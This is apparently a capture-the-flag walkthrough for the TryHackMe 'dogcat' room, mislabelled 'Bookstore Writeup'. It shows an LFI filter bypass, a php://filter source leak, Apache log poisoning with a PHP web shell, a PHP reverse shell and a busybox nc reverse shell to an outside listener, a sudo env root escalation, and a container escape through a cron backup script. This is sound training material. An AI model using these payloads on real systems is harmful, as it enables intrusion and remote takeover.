# Bookstore Writeup
*You can find the CTF on [Tryhackme](https://tryhackme.com/room/dogcat)*

## Requirements
+ Always run your tools inside a virtual machine. Kali Linux (or similar) is a good starting point because it comes preloaded with many security tools, but **any Linux distro** in a VM is fine as long as you install what you need. Try not to use the Hackbox and setup your own env!
+ Before reading this writeup, please read the [README](../README.md), because what you are looking for might not be here.

## The Writeup

### First Flag

<details>
  <summary>Hint 1</summary>

The bouncer is strict: no pet, no entry! Make sure you walk the `dog` or pet the `cat` on your way in.
</details>

</details>

<details>
  <summary>Solution</summary>

Let's analyze the website. The `view` parameter appears to accept either "dog" or "cat", loading a random photo stored in `/dogs` or `/cats`. Before attempting LFI, let's enumerate the website to gather more clues.

```bash
    ┌──(kali㉿)-[~]
    └─$ gobuster dir -u http://10.80.133.249/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,tx
    t
    ===============================================================
    Gobuster v3.8
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.80.133.249/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.8
    [+] Extensions:              php,html,txt
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /index.php            (Status: 200) [Size: 418]
    /cat.php              (Status: 200) [Size: 26]
    /flag.php             (Status: 200) [Size: 0]
    /cats                 (Status: 301) [Size: 313] [--> http://10.80.133.249/cats/]
    /dogs                 (Status: 301) [Size: 313] [--> http://10.80.133.249/dogs/]
    /dog.php              (Status: 200) [Size: 26]
```
`flag.php` looks interesting, but accessing it directly yields no output. We will keep this in mind for later.

Suspecting the view parameter is vulnerable to LFI, instead of manual testing, I will use a specific LFI wordlist from SecLists.

```bash
    ┌──(kali㉿)-[~]
    └─$ wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hw 44 "http://10.80.133.249/?view=FUZZ"
    /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************

    Target: http://10.80.133.249/?view=FUZZ
    Total requests: 930

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload
    =====================================================================

    000000007:   200        25 L     78 W       785 Ch      "%0a/bin/cat%20/etc/passwd"
    000000008:   200        25 L     78 W       785 Ch      "%0a/bin/cat%20/etc/shadow"
    000000637:   200        23 L     74 W       797 Ch      "/var/lib/mlocate/mlocate.db"
```

The behavior of the website is intriguing. It seems to block almost everything, but when the string "cat" is present, we get a verbose error. This error reveals that the server is trying to use an include function on a file and automatically appends .php to the end of our payload.

To bypass the filter, we simply need to include "cat" (or "dog") in our payload. Since we know the /cats directory exists, we can use it as part of our LFI path. Let's try to access the flag.php file we found earlier using directory traversal:
```
http://10.80.183.89/?view=cats/../flag
```
It works! However, it shows nothing. This is expected since flag.php produced no output earlier, suggesting the flag is likely stored in a variable within the script. We need to view the source code rather than execute it. We can achieve this using the PHP base64 filter wrapper:
```
http://10.80.183.89/?view=php://filter/convert.base64-encode/resource=cats/../flag
```

This payload tells the server to encode the resource in Base64 instead of running it as PHP code.

![1](/Dogcat/screenshots/1.png) 

Now, we just need to decode the Base64 string to retrieve our first flag.
</details>

### Second Flag

<details>
  <summary>Hint 1</summary>
Servers keep a diary of every visitor. Maybe you can leave an executable autograph?
</details>

<details>
  <summary>Solution</summary>

To fully understand the filter we are facing, we need to examine the source code of `index.php`, just like we did for the previous flag.
Using the base64 wrapper again on `index`, we retrieve this snippet:

```
http://10.80.183.89/?view=php://filter/convert.base64-encode/resource=cats/../index
```
```php
	$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
        if(isset($_GET['view'])) {
            if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                echo 'Here you go!';
                include $_GET['view'] . $ext;
```
This code reveals a critical vulnerability. The script checks if "cat" or "dog" is present in the payload, but then it appends the $ext variable. Crucially, we can control this variable via the URL. If we leave it empty (&ext=), we can bypass the forced .php extension.

Let's test this by attempting to read a non-PHP file, such as the Apache access log (/var/log/apache2/access.log):

```
http://10.80.183.89/?view=cats/../../../../../var/log/apache2/access.log&ext=
```

![2](/Dogcat/screenshots/2.png)

Success! We can now read any file on the system. For those who read my previous [CTF](/SafeZone1/SAFEZONE1.md), you already know why I targeted the `Apache log`. Since the log file records every connection (including headers), we can "poison" it by injecting PHP code into our User-Agent. 

```bash
    ┌──(kali㉿)-[~]
    └─$ curl -A "<?php system($_GET['cmd']); ?>" http://10.80.131.30/
```
Now that the `log` is poisoned, we can execute arbitrary commands via the cmd parameter by including the log file. During my testing, standard reverse shells seemed unstable, but a URL-encoded `PHP reverse shell` worked perfectly.

```php
    GET /?view=cats/../../../../../var/log/apache2/access.log&ext=&cmd=php+-r+'$sock%3dfsockopen("192.168.177.1",9001)%3bpassthru("sh+<%263+>%263+2>%263")%3b' HTTP/1.1
    Host: 10.80.183.89
    Accept-Language: it-IT,it;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
```

We are in! A quick search through the filesystem helps us locate the second `flag`:

```bash
find / -name "*flag*" 2>/dev/null
...
/var/www/flag2_QMW7JvaY2LvK.txt
```


</details>

### Third and Fourth Flag

<details>
  <summary>Hint 1</summary>

Check what `sudo` lets you do without a password.
</details>

<details>
  <summary>Hint 2</summary>

I feel trapped in a box...
</details>

<details>
  <summary>Solution</summary>

First, let's enumerate our current privileges to see if there is an easy path to root within the container.
```bash
sudo -l
Matching Defaults entries for www-data on ceb3b4c31a67:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on ceb3b4c31a67:
    (root) NOPASSWD: /usr/bin/env
```
We have a classic `GTFOBin` configuration here. We can run `/usr/bin/env` as root without a password. Since env can be used to execute other commands, we can simply spawn a bash shell with root privileges.

```bash
    sudo /usr/bin/env /bin/bash
    whoami
    root
    cd /root
    ls
    flag3.txt
    cat flag3.txt
```
That was an easy flag! 

While exploring the filesystem, I found an interesting backup script located in `/opt/backups/`.

```bash
    #!/bin/bash
    tar cf /root/container/backup/backup.tar /root/container
```

The script archives the `/root/container` directory. We are not on the host but inside a container! We can confirm this by checking for the .dockerenv file in the root directory.
```bash
    cd /
    ls -la
    total 80
    drwxr-xr-x   1 root root 4096 Dec 13 17:40 .
    drwxr-xr-x   1 root root 4096 Dec 13 17:40 ..
    -rwxr-xr-x   1 root root    0 Dec 13 17:40 .dockerenv
```
We are definitely inside a container.

The `backup.sh` script is likely being executed by a Cron Job on the Host machine. Since we are root inside the container, if we can modify this script, the Host will execute our malicious code when the backup job runs.

Let's overwrite the script with a reverse shell payload pointing back to our listener.

```bash
    echo "busybox nc 192.168.177.1 9001 -e sh" > /opt/backups/backup.sh
```

Now we just need to wait for the `cron job` to trigger. After about a minute:

```bash
    Ncat: Listening on 0.0.0.0:9001
    Ncat: Connection from 10.80.183.89:36676.
    ls
    container
    flag4.txt
    cat flag4.txt
```
</details>